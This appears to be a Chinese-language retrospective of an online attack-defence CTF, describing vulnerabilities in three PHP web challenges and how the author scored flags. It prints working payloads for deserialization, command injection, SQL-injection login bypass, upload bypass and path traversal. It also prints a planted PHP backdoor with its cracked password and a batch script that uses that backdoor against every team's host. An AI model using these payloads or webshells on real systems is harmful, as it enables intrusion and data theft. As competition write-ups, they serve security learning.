@@ -1,0 +1,254 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="3bf07b0d409ce0c745ceba539f944018">前言</h2>
+<p>10.3 <a href="https://www.xmcve.com/" target="_blank">星盟安全</a>周年庆举办了一场线上AWD比赛</p>
+<p>参赛队伍总计31支，见到了不少熟悉的ID</p>
+<p>神仙大战果然被暴打hhhhhh，运气好还水了一个小奖品。</p>
+<p>学到了不少东西，今天来写一下复盘总结。</p>
+<h2 data-content="1" id="e3704437b33b8b9b99a5087e8690e22d">比赛规则</h2>
+<ul>
+<li>
+<p>每个队伍分配到一个docker主机，给定<code>web</code>(web)/<code>pwn</code>(pwn)用户权限，通过特定的端口和密码进行连接；</p>
+</li>
+<li>
+<p>每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍。</p>
+</li>
+<li>
+<p>选手需自行登录平台熟悉自助式初始化、api提交flag等功能。初始密码为队长所设密码，队长需在比赛开始前10分钟向主办方提交密码，过期未提交视为弃权。</p>
+</li>
+<li>
+<p>选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮。选手需要保证己方服务的可用性，每次服务不可用，扣除10分；服务检测五分钟一轮；</p>
+</li>
+<li>
+<p>不允许使用任何形式的DOS攻击，第一次发现扣1000分，第二次发现取消比赛资格。</p>
+</li>
+</ul>
+<p>比赛最终结果将在10月3日晚19:00-19:30于北极星杯网络安全交流群直播公布，同时会有技术分享及抽奖活动，敬请关注。</p>
+<h2 data-content="1" id="39f7379ada8b70a08463ba218357100e">比赛开始</h2>
+<p>这次比赛3个web 2个pwn</p>
+<p>首先就是老套路，打包源码跟数据库，然后D盾扫一扫。</p>
+<p>因为队友的分工是权限维持，自己的分工主要是get flag，就直接看漏洞吧。</p>
+<h3 data-content="1" id="3b7375f64436d623b6cee16b01d2a9fc">WEB1</h3>
+<h4 data-content="1" id="9eb6072877d0a127fedddc93ef04e068">预留后门</h4>
+<p><img src="https://yzddmr6.tk/images/1570154788024.png"/></p>
+<p><img src="https://yzddmr6.tk/images/1570154841562.png"/></p>
+<p>三个冰蝎一个普通一句话</p>
+<p>难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？</p>
+<p>第一时间写好了普通一句话的批量脚本</p>
+<p><img src="https://yzddmr6.tk/images/1570155335652.png"/></p>
+<p>改了改让他自动提交</p>
+<p>当时大家可能都还没修，手速快就自动交了两轮</p>
+<p>但是可以看到10队已经上了通防脚本，返回了一个假的flag</p>
+<h4 data-content="1" id="2fe51c962c5e150f9dc8633c68271080">反序列化</h4>
+<p>sqlhelper.php最下面有这样一句</p>
+<pre><code>if (isset($_POST['un']) &amp;&amp; isset($_GET['x'])){
+class A{
+    public $name;
+    public $male;
+
+    function __destruct(){
+        $a = $this-&gt;name;
+        $a($this-&gt;male);
+    }
+}
+
+unserialize($_POST['un']);
+}</code></pre>
+<p>$name 传个system $male传个cat /flag 就可以拿到flag了</p>
+<p>payload:</p>
+<p>GET: <code>?x=yzddmr6</code></p>
+<p>POST: <code>un=O:1:"A":2:{s:4:"name";s:6:"system";s:4:"male";s:9:"cat /flag";};</code></p>
+<h4 data-content="1" id="c4482ee5a54b4754e49b21d72bc06ae1">注入上传</h4>
+<p>login.php</p>
+<pre><code>&lt;?php
+if (isset($_POST['username'])){
+    include_once "../sqlhelper.php";
+    $username=$_POST['username'];
+    $password = md5($_POST['password']);
+    $sql = "SELECT * FROM admin where name='$username' and password='$password';";
+    $help = new sqlhelper();
+    $res  = $help-&gt;execute_dql($sql);
+    echo $sql;
+    if ($res-&gt;num_rows){
+        session_start();
+        $row = $res-&gt;fetch_assoc();
+        $_SESSION['username'] = $username;
+        $_SESSION['id'] = $row['id'];
+        $_SESSION['icon'] = $row['icon'];
+        echo "&lt;script&gt;alert('登录成功');window.location.href='/'&lt;/script&gt;";
+    }else{
+        echo "&lt;script&gt;alert('用户名密码错误')&lt;/script&gt;";
+    }
+}
+?&gt;</code></pre>
+<p>可以看到直接把接收到了$username给带入到了sql语句中，产生注入</p>
+<p>直接用万能密码就可以绕过</p>
+<p>接着往下看登录之后可以做什么</p>
+<p>info.php</p>
+<pre><code>if (isset($_FILES)) {
+        if ($_FILES["file"]["error"] &gt; 0) {
+            echo "错误：" . $_FILES["file"]["error"] . "&lt;br&gt;";
+        } else {
+            $type = $_FILES["file"]["type"];
+            if($type=="image/jpeg"){
+                $name =$_FILES["file"]["name"] ;
+                if (file_exists("upload/" . $_FILES["file"]["name"]))
+                {
+                    echo "&lt;script&gt;alert('文件已经存在');&lt;/script&gt;";
+                }
+                else
+                {
+                    move_uploaded_file($_FILES["file"]["tmp_name"], "assets/images/avatars/" . $_FILES["file"]["name"]);
+                    $helper = new sqlhelper();
+                    $sql = "UPDATE  admin SET icon='$name' WHERE id=$_SESSION[id]";
+                    $helper-&gt;execute_dml($sql);
+                }
+            }else{
+                echo "&lt;script&gt;alert('不允许上传的类型');&lt;/script&gt;";
+            }
+        }
+}</code></pre>
+<p>可以看到他对文件类型的判断仅仅是<code>if($type=="image/jpeg")</code> 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在<code>assets/images/avatars/</code>目录下。</p>
+<p>但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。</p>
+<h3 data-content="1" id="a6a22a77b262aa1675fc6677bb5a1c5a">WEB2</h3>
+<p>web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！</p>
+<h4 data-content="1" id="dfb310cdf5ad46a4aecf4bd9ea2276dd">预留后门</h4>
+<p><img src="https://yzddmr6.tk/images/1570156318012.png"/></p>
+<p>pww.php跟pass.php都是冰蝎。。。</p>
+<p>不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门</p>
+<p>index.php里面就是一个普通的一句话</p>
+<p><img src="https://yzddmr6.tk/images/1570156512803.png"/></p>
+<h4 data-content="1" id="002eb55a9684d1a90a1e29112057bf81">命令注入</h4>
+<p>我们可以看到D盾还报了一个exec后门</p>
+<p><img src="https://yzddmr6.tk/images/1570157981737.png"/></p>
+<p>直接把$host双引号里带入</p>
+<p>然后看一下$host是怎么来的</p>
+<p><img src="https://yzddmr6.tk/images/1570158053833.png"/></p>
+<p>然后看数据是如何放入数据库的</p>
+<p><img src="https://yzddmr6.tk/images/1570158097851.png"/></p>
+<p>在收到<code>$_POST['host']</code>后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠</p>
+<p>但是实际上在执行的<code>$r = exec("ping -c 1 $host");</code>这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。</p>
+<p>因为exec是没有回显的，所以构造以下payload<br/>
+<code>||cat /flag &gt; /ver/www/html/1.txt</code></p>
+<p>把flag输出到网站根目录下</p>
+<p>好像是需要登录，具体我也忘了</p>
+<h4 data-content="1" id="75e36dda5b166b604719d1d2ae796275">任意文件读取</h4>
+<p>img.php</p>
+<pre><code>&lt;?php
+$file = $_GET['img'];
+$img = file_get_contents('images/icon/'.$file);
+//使用图片头输出浏览器
+header("Content-Type: image/jpeg;text/html; charset=utf-8");
+echo $img;
+exit;</code></pre>
+<p>payload:<code>/img.php?img=../../../../../../../flag</code></p>
+<h4 data-content="1" id="db8c0bab90dee8b974cefe6bc3e6d54c">反序列化</h4>
+<p>同web1，只不过不需要x参数了</p>
+<h3 data-content="1" id="393707f5eb3f1837b67a51ccba44c869">WEB3</h3>
+<p>能利用起来的好像就这一个洞，当时也没来得及看</p>
+<h4 data-content="1" id="0073ffc5574272c2ea932551d54ed6e1">命令执行</h4>
+<p><img src="https://yzddmr6.tk/images/1570158908529.png"/></p>
+<p>export.php</p>
+<pre><code>&lt;?php
+    if (isset($_POST['name'])){
+    $name = $_POST['name'];
+    exec("tar -cf backup/$name images/*.jpg");
+    echo "&lt;div class=\"alert alert-success\" role=\"alert\"&gt;
+    导出成功,&lt;a href='backup/$name'&gt;点击下载&lt;/a&gt;&lt;/div&gt;"}
+?&gt;</code></pre>
+<p>老套路，同web2</p>
+<p>payload: <code>|| cat /flag &gt; /var/www/html/1.txt ||</code></p>
+<h2 data-content="1" id="b1d1fa1cf7091b58e5390630c2754ae3">艰难的权限维持</h2>
+<p>其实AWD比赛刚开始的时候，最重要的是维持权限而不是急着交flag。</p>
+<p>当我还在审第一个web的时候，看到预留后门就问队友要不要给他框架弹个shell</p>
+<p>结果他告诉我框架爆炸了。。。弹shell一直500。。。</p>
+<p>缓缓打出三个问号？？？喵喵喵？？？</p>
+<p>以前都是用团队的这个框架没问题，结果今天死活连不上。。。。</p>
+<p>GG，这咋整啊，31个队手工维权吗。。。</p>
+<p>所以就只能搞一些骚操作</p>
+<h3 data-content="1" id="37d2e552e825df57ad54137cc3fa095c">循环批量GET FLAG</h3>
+<p><img src="https://yzddmr6.tk/images/1570160124218.png"/></p>
+<p>撸了一串脚本，来回跑，然后加上接口自动提交，没有框架只能这样了</p>
+<p><img src="https://yzddmr6.tk/images/1570160030390.png"/></p>
+<p><img src="https://yzddmr6.tk/images/1570160076185.png"/></p>
+<p><img src="https://yzddmr6.tk/images/1570160104981.png"/></p>
+<p><img src="https://yzddmr6.tk/images/1570160280961.png"/></p>
+<h3 data-content="1" id="6c6824e88f6a5a57efeae3e756ebec10">乌鸦坐飞机</h3>
+<p>对，没错，我们就是乌鸦，坐了别的队的飞机。</p>
+<p>自己靶机的流量日志上发现了别的队伍的payload</p>
+<p><img src="https://yzddmr6.tk/images/1570160326629.png"/></p>
+<p>写了个脚本看了下，几乎所有的队伍都被种上了这个师傅的马</p>
+<p><img src="https://yzddmr6.tk/images/1570160390768.png"/></p>
+<p>不死马循环写入，被删后马上复活</p>
+<p>你的马看起来不错，下一秒就是我的了。</p>
+<p>白嫖了好几轮的flag</p>
+<p>然后闲的没事想着不如连上蚁剑看看吧，找找其他师傅的马</p>
+<p>批量导入一下</p>
+<p><img src="https://yzddmr6.tk/images/1570160735858.png"/></p>
+<p>看见其他队伍被种了马，满怀热泪的帮他们删了站。</p>
+<p><img src="https://yzddmr6.tk/images/1570160809621.png"/></p>
+<p>有一个队伍被命令注入打惨了，也帮他们删个站吧。</p>
+<p><img src="https://yzddmr6.tk/images/1570160873622.png"/></p>
+<p>当然还看到不少其他队伍的马</p>
+<p><img src="https://yzddmr6.tk/images/1570160915106.png"/></p>
+<p>甚至还有批量上waf的py脚本</p>
+<p>毕竟是其他队伍的内部脚本，象征性打个码</p>
+<p><img src="https://yzddmr6.tk/images/1570160963467.png"/></p>
+<p>流量日志里还发现一个狼人队伍的循环感染不死马</p>
+<p><img src="https://yzddmr6.tk/images/1570161370551.png"/></p>
+<p>会遍历目录把所有的php文件头部加上后门</p>
+<pre><code>&lt;?php if (md5($_REQUEST['pass'])==="8e68ca4946b8e146a408f727eaf9da7c"){@eval($_REQUEST['code']);@system($_REQUEST['sys']);} ?&gt;</code></pre>
+<p><img src="https://yzddmr6.tk/images/1570161032200.png"/></p>
+<p>不过惊讶的是他的md5居然可以解开</p>
+<p><img src="https://yzddmr6.tk/images/1570161555323.png"/></p>
+<p>somd5牛逼！</p>
+<p><img src="https://yzddmr6.tk/images/1570161507609.png"/></p>
+<p><img src="https://yzddmr6.tk/images/1570161042659.png"/></p>
+<p>好马，下一秒就是我的了</p>
+<p>批量脚本走起</p>
+<pre><code>import requests
+import json
+url="http://39.100.119.37:{0}{1}80/login/index.php?pass=Happy.Every.Day&amp;code=system('cat /flag');"
+
+def submit(flag):
+    hosturl="http://39.100.119.37:10000/commit/flag"
+    data={'flag':flag,"token":"xxxxx"}
+    data=json.dumps(data)
+    r=requests.post(hosturl,data=data,headers={"Cookie":"PHPSESSID=xxxxx","Content-Type":"application/json; charset=UTF-8"})
+    print(r.text)
+
+for j in range(1,4):
+    for i in range(1,32):
+        i=str(i).zfill(2)
+        url1=url.format(j,i)
+        print(url1)
+        try:
+            res=requests.get(url=url1)
+            if 'flag' in res.text:
+                submit(res.text[0:38])
+                print(res.text[0:38])
+        except:
+            pass</code></pre>
+<h2 data-content="1" id="2a62352057f7305f20b19372991cf07b">尾声</h2>
+<p>最后web基本上都修了，payload已经打不动了</p>
+<p>只能靠不死马来get flag</p>
+<p>因为开始手快，得分比较多，还有负责修的队友比较给力，掉分不是很多。</p>
+<p>然而毕竟是白嫖别人的马，所以增长分数的速度越来越慢</p>
+<p>最后还往后掉了一名，不过还拿个小奖hhhhh</p>
+<h2 data-content="1" id="be5fc9d11537be3a0335b49602e4a8b1">总结</h2>
+<p>师傅们一个个都心狠手辣，但是说到最后还是自己有很多没有考虑到的地方</p>
+<p>因为框架主要是需要先弹个shell到自己的服务器，然后才能自动维权，get flag等一系列操作</p>
+<p>但是开始框架崩了后直接懵了，不知道怎么办</p>
+<p>其实现在想自己完全可以当时重写一个批量种不死马的脚本来维权</p>
+<p>但是当时31个队伍，三个一堆洞的web，难免有些手忙脚乱。</p>
+<p>有些队伍的通防很厉害，匹配到关键字直接返回一个假的flag，自己准备也写一个。</p>
+<p><img src="https://yzddmr6.tk/images/1570162784686.png"/></p>
+<p>怀疑他们用的都是一家的脚本。。。。返回的flag都一样</p>
+<h2 data-content="1" id="27f78a67b8a6937666ada34c760a0117">最后</h2>
+<p>AWD一般都是线下赛，线上AWD见得还不多。</p>
+<p>星盟的这个线上赛体验还是很不错的，能够撑住31个队伍，每个队伍5个题也是挺厉害的</p>
+<p>中途虽然平台有宕机但是很快就恢复了。</p>
+<p>给星盟点个赞，希望今后能够越办越好~</p>
+<p><strong>本人水平有限，文笔较差，如果有什么写的不对的地方还希望大家能够不吝赐教</strong></p>
+</div>
+</div>
